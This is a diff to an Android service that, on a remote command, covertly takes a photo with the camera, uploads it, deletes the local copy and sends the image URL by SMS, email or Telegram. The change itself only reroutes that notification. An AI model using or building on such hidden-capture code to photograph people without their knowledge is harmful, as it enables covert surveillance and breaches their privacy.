@@ -46,12 +46,13 @@ public class HiddenCaptureImageService extends HiddenCameraService {
 
     private static final String TAG = HiddenCaptureImageService.class.getSimpleName();
     private boolean isTest = false;
-    private String sender = null;
+    private String sender = null, app = null;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         isTest = intent.getBooleanExtra("test", false);
         sender = intent.getStringExtra("sender");
+        app = intent.getStringExtra("app");
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
 
@@ -134,14 +135,18 @@ public class HiddenCaptureImageService extends HiddenCameraService {
                                 String telegramId = settings.getString("telegramId", "");
 
                                 Intent newIntent = new Intent(HiddenCaptureImageService.this, SmsSenderService.class);
-                                newIntent.putExtra("email", email);
-                                newIntent.putExtra("telegramId", telegramId);
                                 newIntent.putExtra("command", Command.TAKE_PHOTO_COMMAND);
                                 newIntent.putExtra("imageUrl", imageUrl);
-                                if (StringUtils.isNotEmpty(sender)) {
-                                    newIntent.putExtra("phoneNumber", sender);
+                                if (StringUtils.isNotEmpty(app)) {
+                                    newIntent.putExtra("app", app);
                                 } else {
-                                    newIntent.putExtra("phoneNumber", phoneNumber);
+                                    newIntent.putExtra("email", email);
+                                    newIntent.putExtra("telegramId", telegramId);
+                                    if (StringUtils.isNotEmpty(sender)) {
+                                        newIntent.putExtra("phoneNumber", sender);
+                                    } else {
+                                        newIntent.putExtra("phoneNumber", phoneNumber);
+                                    }
                                 }
                                 Files.deleteFileFromContextDir(imageFile.getName(), HiddenCaptureImageService.this, true);
                                 HiddenCaptureImageService.this.startService(newIntent);
